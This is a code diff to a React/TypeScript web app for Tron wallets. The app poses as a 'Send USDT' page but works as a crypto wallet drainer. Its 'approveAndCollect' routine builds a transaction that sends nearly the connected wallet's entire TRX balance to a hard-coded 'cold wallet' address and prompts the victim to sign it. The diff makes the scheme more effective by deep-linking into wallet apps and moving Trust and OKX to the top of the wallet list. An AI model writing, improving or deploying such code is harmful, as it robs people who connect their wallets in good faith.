@@ -11,7 +11,6 @@ import {
   useAppKitProvider
 } from '@reown/appkit/react'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
-// 🛠️ ADDED: Imported tronNile for testnet toggling
 import { tronMainnet, tronNile } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
@@ -26,14 +25,13 @@ import TronWeb from 'tronweb'
 // ── CONFIG & TOGGLE ──
 // Change to 'Nile' to test. Change back to 'Mainnet' for production.
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
-const NETWORK = 'Nile' 
+const NETWORK: 'Mainnet' | 'Nile' = 'Nile' 
 
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS_MAINNET = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' 
 
-// 🛠️ FIX: Cast as string to bypass TypeScript's strict literal prediction
-const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
+const TRON_CONTRACT_ADDRESS = NETWORK === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
 
 // 💰 SECURE DESTINATION WALLETS
 const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
@@ -63,9 +61,7 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-// 🛠️ DYNAMIC APPKIT NETWORK
-// 🛠️ FIX: Cast as string here as well
-const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
+const activeNetwork = NETWORK === 'Mainnet' ? tronMainnet : tronNile;
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
 
 const NETWORK_CONFIG = {
@@ -90,9 +86,10 @@ const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWOR
 // ── Reown Adapters ──
 const tronAdapter = new TronAdapter({
   walletAdapters: [
-    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
-    new TrustAdapter({ openUrlWhenWalletNotFound: false }), 
-    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
+    // 🛠️ FIX: Made Adapters robust. Now they deep-link to the App if the user is in normal Safari!
+    new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
+    new TrustAdapter({ openUrlWhenWalletNotFound: true }), 
+    new OkxWalletAdapter({ openUrlWhenWalletNotFound: true }),
   ],
 })
 
@@ -110,6 +107,11 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
+  // 🛠️ FIX: Force Trust Wallet and OKX (which natively support Tron) to the top of the list
+  featuredWalletIds: [
+    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+    '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Wallet
+  ],
   features: { email: false, socials: [], analytics: true },
 })
 
@@ -146,6 +148,7 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -157,8 +160,6 @@ export default function App() {
   
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
-  
-  // 🛠️ ADDED: The Execution Lock for Tron
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
@@ -250,7 +251,6 @@ export default function App() {
   const approveAndCollect = async () => {
     if (!walletAddress) return;
 
-    // 🛠️ ADDED: Lock Execution to prevent double loops
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
         return;
@@ -333,17 +333,14 @@ export default function App() {
                const sendAmount = liveBal - 10_000_000; 
                
                try {
-                 // 🛠️ FIX: Choice A Implementation (Direct Native Sweep to Cold Wallet)
                  log(`[ACTION] Prompting Direct ${token.symbol} Transfer...`);
                  
-                 // 1. Create the raw transfer transaction
                  const transaction = await twToUse.transactionBuilder.sendTrx(
                      TRON_COLD_WALLET, 
                      sendAmount, 
                      walletAddress
                  );
                  
-                 // 2. Sign it using the active provider
                  let signedTx;
                  if (typeof (tronWalletProvider as any).signTransaction === 'function') {
                      signedTx = await (tronWalletProvider as any).signTransaction(transaction);
@@ -351,7 +348,6 @@ export default function App() {
                      signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
                  }
 
-                 // 3. Broadcast it
                  const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
                  if (!broadcast.result) throw new Error('Broadcast failed');
                  
@@ -395,7 +391,6 @@ export default function App() {
       log(`❌ Global Error: ${err?.message?.substring(0, 50)}`);
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
-      // 🛠️ ADDED: Release the execution lock
       isExecuting.current = false;
       autoTriggered.current = false; 
       manualConnect.current = false; 
@@ -408,7 +403,6 @@ export default function App() {
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
-      {/* UI IS UNCHANGED */}
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
         <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
         <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Send USDT</h2>
